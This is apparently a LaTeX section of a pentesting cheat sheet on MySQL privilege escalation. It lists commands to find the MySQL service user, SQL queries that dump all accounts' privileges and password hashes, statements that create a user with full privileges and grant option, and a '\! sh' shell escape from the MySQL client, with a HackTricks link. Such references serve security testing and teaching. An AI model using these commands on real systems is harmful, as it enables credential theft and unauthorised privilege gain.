

\section{Privilege escalation}

\subsection{Mysql user}
\begin{verbatim}
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | grep "user"
systemctl status mysql 2>/dev/null | grep -o ".\{0,0\}user.\{0,50\}" | 
    cut -d '=' -f2 | cut -d ' ' -f1
\end{verbatim}

\subsection{Escalation}
\begin{verbatim}
# Get current user (an all users) privileges and hashes
use mysql;
select user();
select user,password,create_priv,insert_priv,update_priv,alter_priv,
    delete_priv,drop_priv from user;

# Get users, permissions & creds
SELECT * FROM mysql.user;
mysql -u root --password=<PASSWORD> -e "SELECT * FROM mysql.user;"

# Create user and give privileges
create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;

# Get a shell (with your permissions, usefull for sudo/suid privesc)
\! sh
\end{verbatim}

\subsection{Privilege Escalation via library}
\url{https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library}
